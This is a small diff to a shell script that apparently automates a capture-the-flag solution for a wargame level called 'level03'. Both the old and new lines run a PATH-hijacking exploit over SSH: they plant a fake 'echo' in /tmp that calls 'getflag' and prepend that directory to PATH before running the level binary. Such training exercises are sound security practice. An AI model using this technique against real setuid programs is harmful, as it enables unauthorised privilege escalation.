@@ -12,4 +12,4 @@ port="$2"
 pass="$3"
 
 sshexec.sh "$host" "$port" level03 "$pass" \
-'set -e; mkdir -p /tmp/level03; echo getflag > /tmp/level03/echo; chmod -R o+xr /tmp/level03; PATH="/tmp/level03:$PATH" ./level03'
+'set -e; mkdir -p /tmp/level03; echo "getflag" > /tmp/level03/echo; chmod -R a+xr /tmp/level03; PATH="/tmp/level03:$PATH" ./level03'
